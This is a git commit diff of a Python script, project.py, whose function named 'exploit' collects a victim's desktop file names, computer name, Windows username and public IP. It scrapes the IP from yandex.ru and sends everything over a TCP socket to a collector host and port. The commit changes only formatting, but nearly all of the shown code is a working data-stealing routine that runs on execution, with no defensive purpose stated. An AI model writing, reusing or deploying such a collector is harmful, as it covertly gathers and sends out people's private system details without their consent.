e2b82f36a256e80ef6cb4a08c6825753395411dd
Aleksey <sidorenkoalekse@mail.ru>
2018-01-23 16:07:22 +0700

    Update project.py

--- project/project.py
+++ project/project.py
@@ -8,15 +8,15 @@ from urllib.request import urlopen
 HOST = 'localhost'
 PORT = 9999
 PATH = 'C://Users//' + str(os.getlogin()) + '//Desktop'
-
+    
         
 def exploit(deskPath):
     desk_files = os.listdir(deskPath)
     target_IP = get_target_ip()
     DATA = []
-    data_1 = 'Target => ' + str(target_IP)
-    data_2 = 'Login => ' + str(os.environ['COMPUTERNAME'])
-    data_3 = 'Username => ' + str(os.environ['USERNAME'])
+    data_1 = 'Target {} '.format(str(target_IP))
+    data_2 = 'Login {}'.format(str(os.environ['COMPUTERNAME']))
+    data_3 = 'Username {}'.format(str(os.environ['USERNAME']))
     data_4 = desk_files
     data_4 = ''.join(desk_files)
     
@@ -33,14 +33,14 @@ def client_side(HOST, PORT, data):
         check_url = urlopen('https://www.google.com')
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
             sock.connect((HOST, PORT))
-            if type(data) == list:
+            if type(data) == list :
                 for element in data:
                     sock.sendall(bytes(element + "\n", "utf-8"))
             else:
                 sock.sendall(bytes(data + "\n", "utf-8"))
     except:
         print('Error connection!')
-    
+        
     
 def get_target_ip():
     url = urlopen('https://yandex.ru/internet/') 
@@ -48,7 +48,6 @@ def get_target_ip():
     out_str = soup.find('div', class_='client__desc')
     out_str = str(out_str)                                                 
     ip = []
-    
     for symbol in out_str:
         if '1234567890.'.find(symbol) != -1:
             ip.append(symbol)
@@ -58,5 +57,3 @@ def get_target_ip():
 
 
 exploit(PATH)
-    
-    
